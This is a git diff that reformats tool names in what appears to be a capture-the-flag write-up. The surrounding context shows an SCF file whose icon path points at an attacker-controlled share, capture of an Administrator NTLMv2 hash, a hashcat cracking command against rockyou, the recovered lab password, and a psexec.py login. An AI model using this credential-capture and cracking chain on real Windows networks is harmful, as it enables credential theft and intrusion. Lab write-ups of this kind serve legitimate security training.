@@ -166,11 +166,11 @@ IconFile=\\Our_IP_Address\\compta\\hacked.ico
 Command=ToogleDesktop
 ```
 
-All we have to do now is start listening and browse to the compta share with *smbclient* utility.
+All we have to do now is start listening and browse to the compta share with `smbclient` utility.
 
 ![](./img-02.png)
 
-And that's our NTLMv2 hash for Administrator user which requires cracking, and so I did with hashcat utility.
+And that's our NTLMv2 hash for Administrator user which requires cracking, and so I did with `hashcat` utility.
 
 ```console
 $ hashcat -m 5600 admin_ntlmv2 /usr/share/wordlists/rockyou.txt  -o cracked.txt
@@ -178,7 +178,7 @@ $ hashcat -m 5600 admin_ntlmv2 /usr/share/wordlists/rockyou.txt  -o cracked.txt
 
 ![](./img-03.png)
 
-This is our password cracked **P@ssw0rd**, let's try and login to the windows machine using *psexec.py* utility.
+This is our password cracked **P@ssw0rd**, let's try and login to the windows machine using `psexec.py` utility.
 
 ![](./img-04.png)
 
